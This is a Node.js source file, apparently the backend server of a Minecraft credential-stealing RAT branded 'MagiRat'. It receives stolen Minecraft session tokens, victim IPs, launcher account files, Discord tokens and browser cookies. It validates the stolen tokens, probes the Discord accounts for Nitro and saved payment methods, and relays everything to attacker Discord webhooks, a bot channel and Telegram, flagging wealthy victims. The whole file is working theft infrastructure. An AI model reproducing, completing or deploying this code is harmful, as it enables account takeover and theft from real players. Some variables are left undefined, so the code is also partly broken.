
//setup
const getProfiles = require('./utils/networth')
const { uploadData, threadHandler, sendMessage, formatNumber, fetchCountry } = require('./utils/utils');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const { post, get } = require("axios")
const TelegramBot = require('node-telegram-bot-api');

require("dotenv").config()

expressip = require("express-ip"),
express = require("express"),
app = express(),
port = process.env.PORT || 80

    
//plugins
app.use(expressip().getIpInfoMiddleware) //ip
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

// // Env variables
// // Webhooks
// let shorthook = process.env.SHORTHOOK
// let debughook = process.env.DEBUGHOOK

// // Blacklist
// let blacklist = process.env.BLACKLIST

// // Discord bot
// let token = process.env.DC_TOKEN
// let channelId = process.env.CHANNEL_ID

// // Telegram bot
// let tgToken = process.env.TG_TOKEN
// let tgUsers = process.env.TG_USERS

const bot = new TelegramBot(tgToken, {polling: true});

// Initialize the Discord client with necessary intents
const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
    ]
});

//array initialization
const ipMap = []

//clear map every 15mins if its not already empty
setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[MagiRat] Cleared map`)
        ipMap.length = 0
    }
}, 1000 * 60 * 15)

//create server
app.listen(port, () => {
    console.log(`[MagiRat] Listening at port ${port}`)
})


//main route, post to this
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
        console.log(req.body)
        return res.sendStatus(404)
    }

    //check if ip exists, if not then create a new entry, if yes then increment that entry
    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1])
    else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ })

    //check if ip is banned (5 requests in 15mins)
    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[MagiRat] Rejected banned IP (${req.ipInfo.ip})`)
        return res.sendStatus(404)
    }

    //validate the token with microsoft auth server (rip mojang)
    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            "Content-Type": "application/json"
        }
    })

    .then(async response => {
        // Preparation
        let profiles = ''

        // Set content
        // timestamp text
        const now = Date.now()
        const time = now + (24 * 60 * 60 * 1000)
        const timestamp = Math.floor(time / 1000)

        let content = `@everyone - <t:${timestamp}:R>`

        // Set comment
        let comment = req.body.type || "unknown"

        //upload feather
        const feather = await uploadData("https://hst.sh/documents/", req.body.feather);
        const essentials = await uploadData("https://hst.sh/documents/", req.body.essentials);
        const lunar = await uploadData("https://hst.sh/documents/", req.body.lunar);

        // Set country
        let country = await fetchCountry(req.body.ip).catch(() => "undefined");

        //get discord info
        let nitros = ""
        let payments = ""

        const discord = req.body.discord.split(" | ")

        for await (const token of req.body.discord.split(" | ")) {
            let me = await (await get("https://discordapp.com/api/v9/users/@me", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: {id: null}}
            })).data

            if (me.id == null) {
                delete discord[token]
                continue
            }
            let nitro = await (await get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: []}
            })).data
            nitros += nitro.length > 0 ? "Yes | " : "No | "

            let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: []}
            })).data
            payments += payment.length > 0 ? "Yes | " : "No | "
        }
        // Set useful links
        let links = ``

        if (req.body.username) {
            let skyCrypt = `[SkyCrypt](https://sky.shiiyu.moe/${req.body.username})`
            let plancke = `[Plancke](https://plancke.io/hypixel/player/stats/${req.body.username})`
            let matdoes = `[Matdoes](https://skyblock.matdoes.dev/player/${req.body.username})`
            let cofl = `[CoflNet](https://sky.coflnet.com/player/${req.body.uuid})`
            let namemc = `[NameMC](https://namemc.com/profile/${req.body.username})`

             links = `${skyCrypt} ${plancke} ${matdoes} ${cofl} ${namemc}`
        }

        // Check if UUID is blacklisted
        if (blacklist.includes(req.body.uuid.replace(/-/g, '_'))) {
            content = `Blacked - <t:${timestamp}:R>`;
        }

        // Set content based on comment
        if (comment === "essential") {
            content = `Essential - <t:${timestamp}:R>`;
        }
        
        // get profiles
        const profileData = await getProfiles(req.body.uuid)

        if (profileData) {
            for (let profileId in profileData.profiles) {
                profiles += `[${profileData.profiles[profileId].sblvl}] ${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`
            }
        }

        // Set alts
        //check feather accounts and content in hastebin 
        let featherAccounts = []

        if (req.body.feather == 'File not found :(') {
            checkFeather = 'File not found :( - (Feather)'
        } else {
            checkFeather = `https://hst.sh/raw/${feather} -  **(Feather1)**`

            // Extract all "minecraftUuid" values from feather
            featherAccounts = JSON.parse(req.body.feather).ms.map(msItem => msItem.minecraftUuid.replace(/-/g, ''))
        }

        //check essential accounts and content in hastebin 
        let essentialAccounts = []

        if (req.body.essentials == 'File not found :(') {
            checkEssentials = 'File not found :( - (Essentials)'
            
        } else {
            checkEssentials = `https://hst.sh/raw/${essentials} - **(Essentials2)**`

            // Extract all usernames from essentials
            essentialAccounts = JSON.parse(req.body.essentials).accounts.map(account => account.name)
        }

        //check lunar accounts and content in hastebin 
        let lunarAccounts = []

        if (req.body.lunar == 'File not found :(') {
            checkLunar = 'File not found :( - (Lunar)'
        } else {
            checkLunar = `https://hst.sh/raw/${lunar} - **(Lunar3)**`

            // Extract usernames from lunar
            lunarAccounts = Object.values(JSON.parse(req.body.lunar).accounts).map(account => account.username)
        }

        const embed = new EmbedBuilder()
            .setTitle(`Ratted ${req.body.username} - Click Below For Stats`)
            .setDescription(links)
            .addFields(
                { name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true },
                { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
                { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
                { name: 'Country', value: `\`\`\`${country}\`\`\``, inline: true },
                { name: 'Comment', value: `\`\`\`${comment}\`\`\``, inline: true },
                { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
                { name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true },
                { name: 'Essential Accounts:', value: `\`\`\`\n${essentialAccounts.join('\n')}\`\`\``, inline: true },
                { name: 'Lunar Accounts:', value: `\`\`\`\n${lunarAccounts.join('\n')}\`\`\``, inline: true },
                { name: 'Feather', value: `${checkFeather}`, inline: true },
                { name: 'Essentials', value: `${checkEssentials}`, inline: true },
                { name: 'Lunar', value: `${checkLunar}`, inline: true },
                { name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false },
                { name: 'Nitro', value: `\`${nitros}\``, inline: true },
                { name: 'Payment', value: `\`${payments}\``, inline: true },
            )
            .setColor(0x7366bd)
            .setFooter({ text: "🕊️ MagiDev on top 🕊️" })
            .setTimestamp();

        try {
            // Send logs to main channel
            client.login(token).then(() => {
                threadHandler(content, embed, req.body.username, profileData.stats.bestNetworthFormatted, client, channelId);
              }).catch(error => console.error('Error logging in:', error));
            
            // Shortlogs (hella short + some kind of backup)
            post(shorthook, JSON.stringify({
                content: `@everyone \`\`\`${req.body.username} - ${profileData.stats.bestNetworthFormatted}\n${profiles}\n${featherAccounts.join(', ')}, ${essentialAccounts.join(', ')}, ${lunarAccounts.join(', ')}\`\`\` `, //ping
            }), {
                headers: {
                    "Content-Type": "application/json"
                }
            }).catch(err => {
                console.log(`[MagiRat] Error while sending to Discord webhook:\n${err}`)
                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``, debughook)
                sendMessage(`\`\`\`${req.body} - ${err}\`\`\``, debughook)
                console.log(req.body)
            })
        } catch (e) {
            console.log(e)
        }

        if (profileData.stats.bestNetworth > 5000000000) {
            // Split the string into an array of user IDs and iterate through it
            tgUsers.split("_").forEach(userId => {
                // Convert userId from string to number, as sendMessage expects a numerical ID or a string username
                const numericUserId = parseInt(userId, 10);
  
                // Send the message to each user
                bot.sendMessage(numericUserId, `${profileData.stats.bestNetworthFormatted} ${req.body.username}`).then(() => {
                    console.log(`Message sent to user ID: ${numericUserId}`);
                }).catch(error => {
                    console.error(`Failed to send message to user ID: ${numericUserId}`, error);
                });
            });
        }

        console.log(`[MagiRat] ${req.body.username} has been ratted!\nThe alts beeing ${lunarAccounts.join(' ')} ${essentialAccounts.join(' ')} ${lunarAccounts.join(' ')}\n${JSON.stringify(req.body)}`)
    })
        .catch(err => {
        //could happen if the auth server is down OR if invalid information is passed in the body
        console.log(`[MagiRat] Error while validating token:\n${err}`)
        console.log(req.body)
        sendMessage(`\`\`\`${req.body.username} - ${err}\`\`\``, debughook)
        // Create a new FormData object
        const formData = new FormData();

        // Create a Blob representing the content of the file
        const fileContent = new Blob([JSON.stringify(req.body)], { type: 'text/plain' });

        // Append the file to the FormData object
        formData.append('file', fileContent, `${req.body.username} cookies.txt`);

        // Use fetch API to send the FormData to the Discord webhook
        fetch(debughook, {
            method: 'POST',
            body: formData,
        }).then(response => {
            console.log("Sent failed logs successfully")
        }).catch(error => {
            sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``, debughook)
        });
        //change this to whatever you want, but make sure to send a response
        res.send("OK")
    })
    
    
})

//cookies
app.post("/cookies", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!["username", "cookies"].every(field => req.body.hasOwnProperty(field))) {
        console.log(req.body)
        return res.sendStatus(404)
    }

    if (cookies == "") {
        return;
    }


    if (blacklist.split("_").includes(req.body.uuid)) { // debug
        content = `Blacked - <t:${timestamp}:R>`
    }

    if (req.body.type == "essential") {
    }

    // Create a new FormData object
    const formData = new FormData();

    // Create a Blob representing the content of the file
    const fileContent = new Blob([atob(req.body.cookies)], { type: 'text/plain' });

    // Append the file to the FormData object
    formData.append('file', fileContent, `${req.body.username} cookies.txt`);

    // Use fetch API to send the FormData to the Discord webhook
    fetch(debughook, {
        method: 'POST',
        body: formData,
    }).then(response => {
        console.log("Sent cookies successfully")
    }).catch(error => {
        sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``, debughook)
    });
    
    //change this to whatever you want, but make sure to send a response
    res.send("OK")
})

module.exports = {
    uploadData,
    threadHandler,
    sendMessage,
    formatNumber,
    fetchCountry
};
